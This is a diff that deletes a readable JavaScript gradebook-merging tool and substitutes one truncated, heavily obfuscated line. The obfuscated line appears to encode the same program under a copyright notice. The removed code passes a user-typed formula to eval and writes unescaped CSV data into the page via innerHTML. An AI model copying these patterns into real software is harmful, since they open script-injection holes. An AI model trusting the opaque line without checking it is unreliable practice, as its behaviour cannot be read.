@@ -1,956 +1,1 @@
-function $(x)
-{
-   return document.getElementById(x);
-}
- 
-let b=0, g=0;
-let bl = [0,0,0];
-let maintbl = null;
-let source0 = new Array();
-let mergebtn, matchbtn, swapbtn, headingset;
-let courselistobj = [];
-onload = function()
-{
-    maintbl =   document.getElementsByTagName('table')[1];
-    source0[0]  = $('bbsource').value;
-    source0[1] = $('googlesource').value;
-    mergebtn = $('merge');
-    matchbtn = $('match'); 
-    swapbtn =  $("swapbt");
-    headingset =  $("heading");
-    matchbtn.style.display = 'none';
-    mergebtn.style.display = 'none';
-    swapbtn.style.display = 'none';
-    headingset.style.display = 'none';
-    let course = localStorage["course"];
-    let courseliststr = localStorage["courselist"];
-     
-    var regl = $("reglist");
-    var regarrstr = localStorage["reglist"];
-    if (regarrstr!=null)
-    {
-       var regarr = JSON.parse(regarrstr);
-       for (let l = 0;l < regarr.length && l < 25; l++)
-        {
-            let option = document.createElement('option');
-            option.value = regarr[l][0];
-           regl.appendChild(option);
-        }
-    }
-    if (courseliststr!=null)
-    {
-        courselistobj = JSON.parse(courseliststr);
-        let dl = $('courselist');
-        for (let l = 0;l < courselistobj.length; l++)
-        {
-            let option = document.createElement('option');
-            option.value = courselistobj[l];
-            dl.appendChild(option);
-        }
-    }
-    let dl = $('course');
-    if (course != null)
-    {
-        dl.value = course;
-        loadcoursesource(course);
-    }
-   
-}
-
-function buildcourselist(t)
-{
-    let c = t.value;
-    if (c == '') return;
-    let dl = $('courselist');
-    let l=0;
-    for (l = 0;l < dl.options.length; l++)
-    {
-        if (dl.options[l].value == c) break;
-    }
-    if (l == dl.options.length)
-    {
-        let option = document.createElement('option');
-        option.value = c;
-        dl.appendChild(option);
-        courselistobj[courselistobj.length] = c;
-        localStorage["courselist"] = JSON.stringify(courselistobj);  
-    }
-    loadcoursesource(c);
-}
-function changedsource(t)
-{
-    var v = t.value;
-    var alls = localStorage['reglist'];
-    if (alls!=null)
-    {
-        var x = JSON.parse(alls);
-        for (var i=0; i < x.length; i++)
-            if (v == x[i][0])
-        {
-            $('targetchar').value = x[i][1];
-            $('regex').checked = x[i][2];
-        }
-    }
-}
-function loadcoursesource(course)
-{
-    for(let cl=0; cl < 3; cl+=2)
-    {
-        let s0 = localStorage["source_"+course+ "_" + cl];
-        if (s0==null || s0=='null' || s0.length < 10) s0 = source0[cl/2];
-        maintbl.rows[1].cells[cl].getElementsByTagName('textarea')[0].value = s0;
-            
-    }
-}
-let maxcol = 0;
-function parse(cl)
-{
-    if (cl==2)
-    {
-        let b1 = $('view');
-        if (b1.value == 'Back') view(b1);
-        maxcol = 0;
-    }
-     
-    let delimiter = ',';
-    if (cl==2)
-    {
-        let sel = $('delimiter');
-        delimiter = sel.options[sel.selectedIndex].value;
-    }
-    
-    let source = maintbl.rows[1].cells[cl].childNodes[0].value;
-    localStorage["source_"+ $('course').value + "_" +  cl] = source;
-    if (delimiter == '  ')
-    {    
-       source = source.replace(/[ ][ ]+/g,'\t');
-       delimiter = "\t";
-    }
-    else if (delimiter == ' ')
-    {
-       source = source.replace(/[ ]+/g,' '); 
-        delimiter = " ";
-    }
-        
-    let m = (new CSVParse(source,'"',delimiter,'\n')).nextMatrix();
-    let s = '<table border=1 id=tbl' + cl + ' bgcolor=#f9f9f9 style=border-collapse:collpase>';
-    if (m.length <2) return;
-    let l = 0; while (l <4 && l < m[1].length && 
-            (m[1][l]==null || m[1][l].replace(/ /,'')=='' || ''+ parseFloat(m[1][l].replace(/ /,'')) == 'NaN')) l++;
-    bl[cl] = l;
-    
-    for (let i=0; i <m.length; i++)
-    {
-        if (m[i].length < 2) 
-        {
-            m.splice(i, 1);
-            i--;
-            continue;
-        }
-        if (cl == 2 && maxcol < m[i].length)
-        {
-            maxcol = m[i].length;
-        }
-        s += '<tr height=28 bgcolor=' + (i==0?'lightgray':'white') + '>';
-        for (let j=0; j <  m[i].length ; j++)
-        {
-            s += '<td align=' + (j<l?'left':'right width=85 ') + '><div style="' + (j<l?"":"width:80px;overflow:hidden") + '" ' + (cl>0||i>0?'':' onmouseover=showfull(this) onmouseexit=showless(this) ') + '><nobr>' + m[i][j] + '</nobr></div></td>';
-        }
-        s += '</tr>'
-    }
-      
-    let t = maintbl.rows[3].cells[cl];
-    if (cl == 0) b = m;else g = m;
-    t.innerHTML = s + '</table>';
-    
-    if ($('tbl0')!=null
-        && $('tbl2')!=null)
-    matchbtn.style.display = 'inline';
-    if ($('tbl0')!=null)
-        swapbtn.style.display = 'inline';
-}
-let pairb = -1, pairg = -1;
-let clickedcellb = null, clickedcellg = null;
-function findPositionnoScrolling(oElement, win)
-{        
-    if (win == null)
-        win = self;
-    if (oElement == null)
-        return [0, 0];
-    if (typeof (oElement.offsetParent) != 'undefined')
-    {
-        var ii = 0;
-        var originalElement = oElement;
-        for (var posY = 0, posX = 0; ii++ < 20 && oElement != null; oElement = oElement.offsetParent)
-        {
-            posY += oElement.offsetTop;
-            posX += oElement.offsetLeft;
-            if (oElement != originalElement && oElement != win.document.body && oElement != win.document.documentElement)
-            {
-                posY -= oElement.scrollTop;
-                posX -= oElement.scrollLeft;
-            }
-        }
-        return  [posX, posY];
-    }
-    else
-    {
-        return  [oElement.x, oElement.y];
-    }
-}
-function showfull(dv)
-{
-   if ($('popdv') != null) showless(); 
-   var xy = findPositionnoScrolling(dv);
-   var hint = document.createElement('span');
-   hint.style.cssText = 'box-shadow:1px 1px gray;height:28px;z-index:10;position:absolute;left:' + (xy[0]-10) + 'px;top:'
-   + (xy[1]-4) + 'px;background:lightyellow;font-weight:700;color:purple';
-   hint.innerHTML = dv.innerHTML;
-   hint.id = 'popdv';
-   document.body.appendChild(hint);
-   setTimeout("showless()", 2000);
-}
- 
-function showless()
-{
-   if ($('popdv') != null) 
-   document.body.removeChild($('popdv'));
-}
-function copy(f, t)
-{
-    let temp = g[f];
-    g[f] = g[t];
-    g[t] = temp;
-    let tbl = $('tbl2'); 
-    let l;
-    for (l=0; l < tbl.rows[t].cells.length; l++)
-    {     
-        tbl.rows[t].cells[l].innerHTML = g[t][l]==null?"":g[t][l];
-    }
-    for (l=0; l < tbl.rows[f].cells.length; l++)
-         tbl.rows[f].cells[l].innerHTML = '&nbsp;';    
-}
-let rowb, rowg;
-function pair(td,m,r0)
-{
-   if (pairg >= 0)
-   {
-      copy(pairg,m);
-      let tr = td.parentNode;
-      tr.parentNode.removeChild(tr);
-      tr = clickedcellg.parentNode;
-      tr.parentNode.removeChild(tr);
-      clickedcellb = clickedcellg = null;
-      pairb = -1;
-      pairg = -1;
-   }
-   else
-   {
-      pairb = m; 
-      clickedcellb = td;
-   }
-}
-function pair1(td,m)
-{
-   if (pairb >= 0)
-   {
-      copy(m,pairb);
-      let tr = td.parentNode;
-      tr.parentNode.removeChild(tr);
-      tr = clickedcellb.parentNode;
-      tr.parentNode.removeChild(tr);
-      clickedcellg = clickedcellb = null;
-      pairb = -1;
-      pairg = -1;
-   }
-   else
-   {
-      pairg = m;
-      clickedcellg = td;
-   }
-}
-function stat(arr,k)
-{
-    let brr = new Array();
-    for (let j=0; j < arr.length; j++)
-    {
-       let f = parseFloat(arr[j]);
-       if ('' + f != 'NaN')
-           brr[brr.length] = f;
-    }
-    if (brr.length == 0) return 0;
-    brr.sort((a, b) => a - b);
-    if (k==0) return brr[0];
-    else if (k==2) 
-        return brr[brr.length-1];
-    let s = 0;
-    for (let j=0; j < brr.length; j++)
-        s += brr[j];
-    return (s/brr.length).toFixed(2);
-}
-let duplicate = [];
-let oldg = [];
-
-function dup(k)
-{
-    let bi = bl[0], gi = bl[2];
-    let tbl = $('tbl2');
-    for (let y in duplicate)
-    {
-        //alert('y=' + y + ',l=' +  g[y].length);
-        if (oldg[y]==null) 
-            oldg[y] = new Array(maxcol);
-        let s = duplicate[y];
-        if (k==3)
-        {
-           for (let j=gi;  j < maxcol; j++)
-           {
-              if (oldg[y][j]!=null)
-              g[y][j] = oldg[y][j];
-              tbl.rows[y].cells[j].innerHTML = g[y][j];
-           }
-        }
-        else if (k==4)
-        {
-           let ll = s[s.length-1];
-           for (let j=gi; j < maxcol; j++)
-           {
-              if (oldg[y][j]==null)
-                  oldg[y][j] = g[y][j];
-              if (oldg[ll]!=null && oldg[ll][j]!=null)  
-                  g[y][j] = oldg[ll][j];
-              else
-                  g[y][j] = g[ll][j];
-              
-              tbl.rows[y].cells[j].innerHTML = g[y][j];
-           }
-        }
-        else
-        for (let j=gi; j < maxcol; j++)
-        {
-           
-           let arr = new Array();
-           let xx = oldg[y][j]==null?g[y][j]:oldg[y][j];
-           if (xx!=null) arr[0] = xx;
-           for (let z=0; z < s.length; z++)
-           {
-               let ll = parseInt(s[z]);
-               let xx = (oldg[ll]==null || oldg[ll][j]==null)?g[ll][j]:oldg[ll][j];
-               if (xx!=null) arr[arr.length] = xx;
-           }
-           let q = stat(arr,k);
-           
-           if (oldg[y][j]==null)
-               oldg[y][j] = g[y][j];
-           g[y][j] = q;
-           if (y >= tbl.rows.length)
-               alert('tbl2.rows[' +y + '] not exist');        
-           else if(j < tbl.rows[y].cells.length)
-                tbl.rows[y].cells[j].innerHTML = q;
-           else 
-               alert('tbl2.rows[' +y + '].cells[' + j + '] not exist');
-        }
-    }
-}
-function copyc(i, mark)
-{
-   let v= new Array();
-   for (let j=0; j < g[i].length; j++)
-   {
-       v[j] = g[i][j];
-   }
-   v[v.length] = mark;
-   return v;
-}
-var matchstrength = 1;// email, two name, 1 name
-function redomatch(sel)
-{
-    matchstrength = sel.options[sel.selectedIndex].value;
-    closethis();
-    parse(2);
-    match();
-}
-function match()
-{
-    duplicate = [];
-    oldg = [];
-    mid = 0;
-    pairb =  pairg = -1;
-    clickedcellb = clickedcellg = null;
-    if (b == null || g == null || b.length <2 || g.length<2)
-    {
-        alert('Enter source and Parse first');
-        return;
-    }
-    
-    let bi = bl[0], gi = bl[2];
-     
-    let newg = new Array(b.length); 
-    for (let m=0; m < b.length; m++)
-        for (let j=0; j < b[m].length; j++)
-           if (b[m][j]==null) b[m][j] ='';
-           else b[m][j] = b[m][j].replace(/^[ ]+/,'').replace(/[ ]+$/,'');
-     let mism = new Array();
-    let maxm = 0;
-    let mts = '';
-    let dup = new Array();
-    for (let i=0; i < g.length; i++)
-    {
-        if (g[i] == null) continue;
-        for (let j=0; j < g[i].length; j++)
-            if (g[i][j] == null)
-                g[i][j] = "";
-            else g[i][j] = g[i][j].replace(/^[ ]+/,'').replace(/[ ]+$/,''); 
-        let m;
-        let arr = new Array();
-        for (m=0; m < b.length; m++)
-        {
-             let count = 0; 
-             let isemail = false;
-             for (let j=0; j < bi; j++)
-             {
-                for (let k=0; k < gi; k++)
-                {
-                   if (b[m][j].toLowerCase() == g[i][k].toLowerCase())
-                   {    
-                       count++;
-                       if (b[m][j].indexOf("@")>0 && b[m][j].indexOf(".")>0)
-                           isemail = true;
-                   }
-                }
-             }
-             if (isemail)
-             {
-                 arr[m] = 1000000 + m;
-             }
-             else
-                 arr[m] = count*1000 + m;
-         }
-         arr.sort((a, b) => a - b);
-         //document.writeln("i=" +i + ", m=" + arr[m-1] + ", count=" + (arr[m-1]%1000) + "<br>");
-             
-         let ss = '';
-         //for (let ll=0; ll < arr.length; ll++) ss +=    arr[ll] + "\n"
-         
-         //maintbl.rows[6].cells[0].getElementsByTagName('textarea')[0].value  += '\n' + arr[arr.length-1];
-         m = arr[arr.length-1];
-         //document.writeln("i=" +i + ", m=" + m + ", m%1000=" + m%1000 + "<br>");
-         if (m < matchstrength*1000)
-         {
-             mism[mism.length] = i;
-         }
-         else
-         {
-             m = m%1000;
-             mts += "," + i + "<->" + m;
-             if (maxm < g[i].length) 
-                 maxm = g[i].length;
-             if (dup[m]==null)
-                 dup[m] = [i];
-             else
-                 dup[m][dup[m].length] = i;
-             
-         }
-    }
-    if (dup[0]== null)
-    {
-        let j=0;
-        for (j=0; j < g[0].length; j++)
-        {
-           let f = parseFloat(g[0][j]);
-           if (''+f != 'NaN') break;
-        }
-        //let cm = confirm("Does the 3rd-party grade book has a heading?");
-        if (j == g[0].length) 
-        {
-           dup[0] = [0];
-        }
-    }
-    let m = 0;
-    let mn = 1;
-    let msg =  "<" + "li>";
-    msg += "Some mismatches were found. If a manual match is found, just click the matched pair.";
-    msg += "<" + "table bgcoloe=white border=1 style=border-collapse:collapse  cellspacing=3><tr><td valign=top><div  style=background-color:blue;color:white>Left Records without Matching</div>";
-    msg += "<" + "table>";
-    let  missleft = false;
-    let rw0=0, rw1=0;
-    for (m=0; m < b.length; m++)
-    {
-        if (dup[m] == null)
-        {
-            //newg[m] = new Array(g[0].length);
-            missleft = true;
-            if (m>0){
-            msg +='<tr height=28>';
-            for (let l=0; l < bi; l++)
-            {
-               msg += '<td bgcolor=white onclick="pair(this,' + m + ',' + (rw0++) +  ')">' + b[m][l] + '</td>';
-            }
-            msg += '<' + '/tr>'
-           }
-        }
-        else
-        {
-            let i = dup[m][0];
-            newg[m] = copyc(i);
-            dup[m].splice(0,1);
-        }
-    }
-    msg += '<' + '/table><'+ '/td><td valign=top><div style=background-color:red>Right Records without Matching</div><table>'
-    let  missright = mism.length>0;
-     
-    for (let j=0; j < mism.length; j++)
-    {
-        let i = mism[j];
-        newg[newg.length] = copyc(i, 'missed');
-        msg +='<tr height=28>';
-        for (let l=0; l < gi; l++)
-        {
-             msg += '<td bgcolor=white onclick="pair1(this,' + (newg.length-1) + ',' + (rw1++) +   ')">' + g[i][l] + '</td>';
-        }
-        msg += '</tr>'
-    }
-    msg += "</table></td></tr></table><br>";
-    if (!missright && !missleft)  msg = '';
-    let hasd = false;
-    let dcount = 0;
-    for (m=0; m < b.length; m++)
-    {
-        if (dup[m] == null || dup[m].length == 0)
-        {
-            continue;
-        }
-        hasd = true;
-        let x = new Array();
-        for(let j=0; j < dup[m].length; j++)
-        {
-            let i = dup[m][j];
-            newg[newg.length] = copyc(i,'duplicate' + m);
-            dcount++;
-            x[x.length] = newg.length-1;
-        }
-        duplicate[m] = x;
-    }
-    if (hasd)
-        msg += '<li>What do you want to do with the <span style=background-color:orange;color:black>' + dcount + ' duplicates</span>?<br><input name=dup value=l  type=radio  onclick=dup(0)>Take the lowest<input name=dup value=h type=radio onclick=dup(2)>Take the highest<input name=dup value=a  type=radio  onclick=dup(1)>Take the average  <input name=dup value=h type=radio onclick=dup(3) checked > Take the first  <input name=dup value=h type=radio onclick=dup(4)> Take the last<br>';
-    msg += '<br><li>Next, you need to decide which column on the right is going to merge to which column on the left. Please note that the red boxes on heading area are editable: typing or keeping as is, selecting, or clearing, correspoding to merging as a new column in the gradebook, overriding an existing column, or discarding that data column, respectively. The Null Heading button clears all headings'; 
-    
-    if (msg!='')
-    {
-        msg += "<br><br><li>The curved box allows you to enter a fomula to convert raw score x to blackboard score as full-point scale you declared on Blackboard may be different from that in the other systems. Using + for plus, - for minus as usual, but * from multiplication, and / for division, e.g, x/10 means the raw score will be converted to one tenth of the score to Blackboard"
-        let dv = document.createElement('div');
-        dv.style.cssText = 'padding:4px;position: absolute;top:200px;left: 50%;-webkit-transform: translate(-50%, 0);transform: translate(-50%, 0);z-index:20;background-color:#f0f0f0;border:1px gray outset;border-radius:4px';
-        dv.innerHTML = '<center><a href=javascript:closethis()>[close]</a><br><br>Match strength:<select name=sel onchange=redomatch(this)><option value=1 " + (matchstrength==1?"selected":"") + ">At least one name part</option><option value=2 " + (matchstrength==2?"selected":"") + ">At least two name parts</option><option value=3 " + (matchstrength==3?"selected":"") + ">require email matching</option></select></center><ul>' +msg   + "</ul><center><a href=javascript:closethis()>[close]</a></center>";
-        dv.id = 'pop';
-        document.body.appendChild(dv);
-    }
-     
-    g = newg;
-    
-    let s = makelist(b[0],bi) + '<table border=1 id=tbl2 bgcolor=#f9f9f9 style=border-collapse:collpase><tr height=28 bgcolor=lightgray>';
-    if (g[0] == null)
-    {
-        g[0] = new Array(maxm);
-    }
-    for (let j=0; j < gi; j++)
-    {
-        s += '<td align=left><nobr>' + (g[0][j]==null?"":g[0][j]) + '</nobr></td>';
-    }
-    for (let j=gi; j < maxm; j++)
-    {
-        s += '<td align=right style="padding:0px 0px 0px 0px"><input style="margin:-1px -1px -1px -1px;border:0px;color:red;border:1px red solid" id="field' + j + '" list="existing" value="' + (g[0][j]==null?(""):g[0][j])+ '"</td>';
-    }
-    s += "</tr>";
-    for (let i=1; i <g.length; i++)
-    {
-        let bgcolor = 'lightgray';
-        let mark = null;
-        if (i >0 &&  i < b.length) 
-        {
-            if (g[i] == null) 
-                bgcolor = 'blue'
-            else
-                bgcolor = 'white';
-        }
-        else if (g[i].length>=maxcol && g[i][maxcol].indexOf('duplicate') == 0)
-        {
-            bgcolor = 'orange';
-            let kk = parseInt(g[i][maxcol].substring(9));
-            mark = b[kk][0];
-            for (let k1 = 1; k1 < bi; k1++)
-                mark += " " + b[kk][k1];
-        } 
-        else if (g[i].length>=maxcol && g[i][maxcol].indexOf('miss') == 0)
-        {   
-            bgcolor = 'red'; 
-            
-        }
-        s += '<tr height=28 bgcolor=' +  bgcolor + '>';
-        if (g[i] == null)
-        {  
-             g[i] = new Array(maxcol);
-             for (let j=0; j < maxcol; j++)
-            {
-               g[i][j] = '';
-               s += '<td ' + (j==0?'onclick=accept(' + i + ',this.parentNode)':'') + ' align=' + (j<gi?'left':'right   width=85  ') + '>&nbsp;&nbsp;</td>';
-            }
-            //s += '<td colspan=' + maxm +'>&nbsp&nbsp;</td>';
-        }
-        else 
-        for (let j=0; j < maxcol; j++)
-        {
-            if (g[i][j]==null)
-                g[i][j] = '';
-            s += '<td ';
-            if (j ==0 && mark!=null)
-                s += ' onmouseover="showdup(\'' + mark + '\','+ i +')" onmouseexit=cleardup('+ i +') ';
-            s +=   (j==0 && i>=b.length ?'onclick=moveto('+i+',this.parentNode)':'') + ' align=' + (j<gi?'left':'right   width=85  ') + '><div style="' + (j<bi?"":"width:80px;overflow:hidden") + '"><nobr>' + (g[i][j]==null?"":g[i][j]) + '</nobr></div></td>';
-        }
-        s += '</tr>';
-    }
-    maintbl.rows[3].cells[2].innerHTML = s + '</table>';
-    matchbtn.style.display = 'none'; 
-    mergebtn.style.display = 'inline';
-    headingset.style.display = 'inline';
-    //$('merge').enabled = true;
-    //$('discard').enabled = true;
-    
-}
-function showdup(mark, i)
-{
-    var tbl0 = $('tbl0');
-    let N = tbl0.rows.length;
-    for(var k=N; k <= i; k++)
-    {
-        tbl0.insertRow(-1);
-        tbl0.rows[k].outerHTML = '<tr height=28><td colspan=' + b[0].length + ' align=right>&nbsp;</td></tr>';
-       /* tbl0.rows[k].cells[0].colSpan = b[0].length;
-        tbl0.rows[k].cells[0].align = 'right';
-        tbl0.rows[k].cells[0].innerHTML = '&nbsp;'
-        tbl0.rows[k].height = '28';*/
-    }
-    for(var k=N; k <= i; k++)
-        tbl0.rows[k].height = '28';
-    tbl0.rows[i].cells[0].innerHTML = mark;
-   
-}
-function cleardup(i)
-{
-    
-}
-function closethis()
-{
-   let dv = $('pop');
-   document.body.removeChild(dv);
-}
-let mid = 0;
-function moveto(i,tr)
-{
-    tr.bgColor = '#ffff22';
-    mid = i;
-}
-function accept(i,tr)
-{
-    if (confirm('Move that line to fill out this blank line because of match?')  )
-    {    
-        g[i] = new Array();
-    for (let j=0; j < g[0].length; j++)
-    {   
-        if (j==0 && tr.cells[j].innerHTML.replace(/&nbsp;/g,'') != '') return;
-        tr.cells[j].innerHTML = tr.parentNode.rows[mid].cells[j].innerHTML;
-        tr.parentNode.rows[mid].cells[j].innerHTML = '&nbsp;&nbsp;';
-        
-        g[i][j] = g[mid][j];
-        g[mid][j] = '';
-    }
-    tr.bgColor = '#fafafa';
-    }
-}
-function makelist(b,l)
-{
-    let s = "<datalist id=\"existing\">\n<option></option>\n"
-    for (;l < b.length; l++)
-    {
-        s += "<option>" + b[l] + "</option>\n"
-    }
-    return s + "</datalist>";
-}
-
-let merged = null;
-function merge()
-{
-    let bi = bl[0], gi = bl[2];
-    let fail = false;
-    let allf = ',';
-    for (let j=gi; j < maxcol; j++)
-    {
-        let field = $('field' + j);
-        if (field==null) 
-        {
-            //alert('field' + j + " is null");
-            continue;
-        }
-        let x=field.value.replace(/^[ ]+/,'').replace(/[ ]+$/,'');
-        if (x!='' && allf.indexOf(',' + x+ ',')>=0)
-        {
-            alert('Repeated');
-            field.focus(); fail =true;
-        }
-        else
-        {
-            g[0][j] = field;
-            allf += field + ',';
-        }
-    }
-    if ( fail) return;
-    merged = new Array();
-    let ms = new Array();
-    for (let i=0; i < b.length; i++)
-    {
-            merged[i] = new Array(b[i].length)
-            for (let l=0; l < merged[i].length; l++)
-                merged[i][l] = b[i][l];
-    }
-    let num = 0;
-    let curve = $('curve').value;
-    for (let j=gi; j < maxcol; j++)
-    {
-        
-        let field = $('field' + j);
-        if (field == null) 
-            continue;
-        let x = field.value.replace(/^[ ]+/,'').replace(/[ ]+$/,'');
-            if (x == '') 
-              continue;
-        g[0][j] = x;
-        let m = bi;
-        for (; m < merged[0].length; m++)
-        {
-            if (merged[0][m] == x)
-                break;
-             
-        }
-         
-        num++;
-         
-        ms[ms.length] = m;
-        
-        for (let i=0; i < b.length; i++)
-        {
-            if (g[i] == null || g[i][j] == null) 
-               merged[i][m] = "";
-            else
-            {
-               let f = parseFloat(g[i][j]);
-               if ('' + f == 'NaN')
-                   merged[i][m] = g[i][j];
-               else
-               {
-                   try
-                   {
-                   var se = curve.replace(/x/g,g[i][j]);
-                   var sc = eval(se);
-                   merged[i][m] = '' + sc.toFixed(2);
-                   }catch(e){alert(se + " seems not a good expression. extra%?");}
-               }
-           }
-        }
-        
-    }
-    if (num == 0) 
-    {
-        alert('No merge is done since all fields are blank');
-        return;
-    }
-    let s = '<table border=1 id=tbl3 bgcolor=#f9f9f9 style=border-collapse:collpase>';
-     
-    for (let i=0; i < b.length; i++)
-    {
-        s += '<tr bgcolor=' + (i==0?'lightgray':'white') + '>';
-        for (let j=0; j < merged[i].length; j++)
-        {
-            s += '<td ' + (ms.indexOf(j)>=0&&i>0?' bgcolor=#f0f090 ':'') + ' align=' + (j<bi?'left':'right  width=85 ') + '><div style="' + (j<gi?"":"width:80px;overflow:hidden") + '"><nobr>' + merged[i][j] + '</nobr></div></td>';
-        }
-        s += '</tr>';
-    }
-    maintbl.rows[4].cells[0].innerHTML = s + '</table><input class=button id="swapb1" type="button"  style=float:left;width:100px  value="Swap Column"   onclick="swap(1)"><input class=button  type="button" style=float:left id="csv0" value="CSV" onclick="csv()"><input class=button  type="button" style=float:center id="csv" value="CSV" onclick="csv()">'; 
-    //$('merge').enabled = false;
-    //$('discard').enabled = false;
-}
-function nullall()
-{
-    for (let i=bl[2]; i < maxcol; i++)
-    {   
-        let field = $('field' + i);
-        if (field != null)
-        field.value = '';
-    } 
-}
- 
-
-function csv()
-{
-    let s = '';
-    for (let i=0; i < b.length; i++)
-    {
-        if (i>0) s += '\n';
-        for (let j=0; j < merged[i].length; j++)
-        {    
-            if (j>0) s += ',';
-            s += '"' + merged[i][j].replace(/"/g,"") + '"';
-             
-        }
-    }
-    
-    let td = maintbl.rows[5].cells[0];
-    td.innerHTML = '<textarea style="width:100%" id="result" rows="' + (b.length+1) + '">' + s + '</textarea>'  
-     + '<center><a id="da" download="' + course.value + '.csv" type="text/csv"><span class=button style="display:inline;width:70px;padding:2px 2px 2px 2px !important">Download</span></a> &nbsp; <a href="javascript:toclip()"><span class=button  style="display:inline;width:70px;padding:2px 2px 2px 2px !important">&nbsp;&nbsp;&nbsp;&nbsp;Copy&nbsp;&nbsp;&nbsp;</span></a></center>';
-    var data = new Blob([s]);
-    var a = document.getElementById('da');
-    a.href = URL.createObjectURL(data);
-}
-function download()
-{
-
-}
-function toclip() {
-  var copyText = document.getElementById("result");
-  copyText.select();
-  copyText.setSelectionRange(0, 99999); /* For mobile devices */
-  document.execCommand("copy");
-  alert("Text has been copied to clipboard. Now you start a window's text editor or notepad and invoke the Paste inside the editor");
-}
-function swap(row)
-{
-    let s = prompt("What number of column is your final score column? It's better to swap it with the email (3rd) column. Enter a pair of columns:", "3 10");
-    if (s == null) return;
-    let ss = s.replace(/^[ ]+/,'').replace(/[ ]+$/,'').replace(/[ ][ ]+/,' ').split(/[ |,]/);
-    if (ss.length!=2) return;
-    let c1 = parseInt(ss[0]);
-    let c2 = parseInt(ss[1]);
-    if (''+c1 == 'NaN' || ''+c2 == 'NaN')return;
-    c1--;c2--;
-    let tbl = $('tbl' + (3*row));
-    for (let j=0; j < b.length; j++)
-    {
-        let t = tbl.rows[j].cells[c1].innerHTML;//b[j][c1];
-        tbl.rows[j].cells[c1].innerHTML = tbl.rows[j].cells[c2].innerHTML;
-        tbl.rows[j].cells[c2].innerHTML = t;
-    }
-    
-}
-let temp;
-function view(btn)
-{
-   let t = $('googlesource');
-   if (btn.value == 'View Tab')
-   {
-      temp = t.value;
-      btn.value  = 'Back';
-      t.value = t.value.replace(/\t/g,'\\t   ').replace(/\n/g,'\\n\n').replace(/\r/g,'\\r');
-   }
-   else
-   {
-       t.value = temp;
-       btn.value = 'View Tab';
-   }
-}
-let oldt = new Array();
-let allregs = [];
-function replace()
-{
-   let t = $('googlesource');
-   let b = $('view');
-   let undo = $('undo');
-   if (b.value == 'Back') view(b);
-   let s =  $('sourcechar');
-   let c =  $('targetchar');
-   let a = $('regex');
-   var rs = localStorage['reglist']; // search a piece of data named relist in cache/ harddrive
-   if (rs == null)
-       allregs = []; 
-   else
-       allregs = JSON.parse(rs);
-   for (var i =0; i< allregs.length; i++)
-       if (allregs[i][0] == s.value) 
-           break;
-   if ( i == allregs.length)
-   {
-       allregs.splice(0,0,[s.value, c.value, ($('regex').checked)]);
-       if (allregs.length > 25)
-           allregs.splice(allregs.length-1,1);
-       localStorage['reglist'] = JSON.stringify(allregs);
-       var newitem = document.createElement('option');
-       newitem.value = s.value;
-       var lt = $('reglist').childNodes;
-       if (lt ==null || lt.length == 0)
-           $('reglist').append(newitem);
-       else
-           $('reglist').insertBefore(lt[0],newitem);
-       $('sourcechar').list = 'reglist';
-       
-   }
-   if (a.checked)
-   try
-   {
-     let r = new RegExp(s.value, "gi");
-     
-     oldt[oldt.length] = t.value;
-     t.value = t.value.replace(r, c.value);
-     undo.style.visibility = 'visible'; 
-   }
-   catch(e){}
-   else
-   {
-     oldt[oldt.length] = t.value;
-     t.value = replaceAll(t.value, s.value, c.value, true);
-     undo.style.visibility = 'visible';  
-   }
-}
-function replaceAll(str, find, newToken, ignoreCase)
-{
-    let i = -1;
-
-    if (!str)
-    {
-        // Instead of throwing, act as COALESCE if find == null/empty and str == null
-        if ((str == null) && (find == null))
-            return newToken;
-
-        return str;
-    }
-
-    if (!find) // sanity check 
-        return str;
-
-    ignoreCase = ignoreCase || false;
-    find = ignoreCase ? find.toLowerCase() : find;
-
-    while ((
-        i = (ignoreCase ? str.toLowerCase() : str).indexOf(
-            find, i >= 0 ? i + newToken.length : 0
-        )) !== -1
-    )
-    {
-        str = str.substring(0, i) +
-            newToken +
-            str.substring(i + find.length);
-    } // Whend 
-
-    return str;
-}
-function undo(btn)
-{
-   let t = $('googlesource');
-   if (oldt.length>=1)
-   {
-   t.value = oldt[oldt.length-1];
-   oldt.splice(oldt.length-1,1);
-   if (oldt.length == 0)
-      btn.style.visibility = 'hidden'; 
-   }
-}
-
-
-
-
+l1l=document.documentMode||document.all;var c6ca8b5de=true;ll1=document.layers;lll=window.sidebar;c6ca8b5de=(!(l1l&&ll1)&&!(!l1l&&!ll1&&!lll));l_ll=location+'';l11=navigator.userAgent.toLowerCase();function lI1(l1I){return l11.indexOf(l1I)>0?true:false};lII=lI1('kht')|lI1('per');c6ca8b5de|=lII;zLP=location.protocol+'0FD';nvcW94t6yPSH72=new Array();r1dT73RIml5QL9=new Array();r1dT73RIml5QL9[0]='\160%33\170Q%4A\127\147';nvcW94t6yPSH72[0]='	~za~~~~~~~~~	~\n~~~\r~~~~~~~~~~~~~~\r~~~~ ~!~"~#~$~%~&~\'~(~)~*~+~,~-~.~/~0~1~2~3~4~5~6~7~8~9~:~;~<~=~>~?~@~A~B~C~D~E~F~G~H~I~J~K~L~M~N~O~P~Q~R~S~T~U~V~W~X~Y~Z~"~~]~^~_~`~a~b~c~d~e~f~g~dl=document.layers;oe=win~mw.op~ya?1:0;da=(~m~o~q~s.}~p~rtMode||}}~tall)&&!~};g~~}"}.}.tEle}#ById;ws~}}.si}bar?true:f}%se;tN=navigator.u}RrA}.}}^Low~yCa}R();iz}V}U.}AexOf(\'netsca}\')>=0}J}L}N}Pl}R;zi}?}||8~la;v}H msg=\'\';function }m}p{r|zaur|-}K}M}}=}A}j}}rr}_ =|.}7|OF}@}|=l~n}]|+n.p|A}^col}w}}y}{}}fi}6|!=-1|}M}O}Q}Si7f=|s})!z|H|f|\r|i;/*|z|{|||}|~|{za{{{{za\r\n* (C) C}yr}[ht 2004-{21 by Syst}7s |, Web, I|(.  A}& R{|{7e}cved{2 *{{Auth}_: Z{Ingya|-L}{3{V{W{X{Y{Z{[{\\{Z{C{{{a{b{c{d|{/{if{	 ty}o}|i|*sago}~mma}{=|D\'|\'}|^}d|{{{{V|r {r|{u{wd{y{{|-|D}0}|M||*|,.}^S}K}g}p|Y}}z}|\'{tps://z{N{P{Rl}}2{rhub}wo|;z	{3{i{	z{t{v{xo{z{U|b 0)z? z\n{Zz~tz|Ozh|3{j{z)z+z-z/z1{Qnz4|Qgz7z9z;/}D{%/|$zN}{zo\n|&|(z|-$(x)\n{zQ{3|3t|5|-zS}2|za}5}7}}9};zx}q\n}zQ\n}6{b|	{.|!}\ry|za{l|C [0,y0];y{zH~sby|Dnu}&y$y so|5ce0y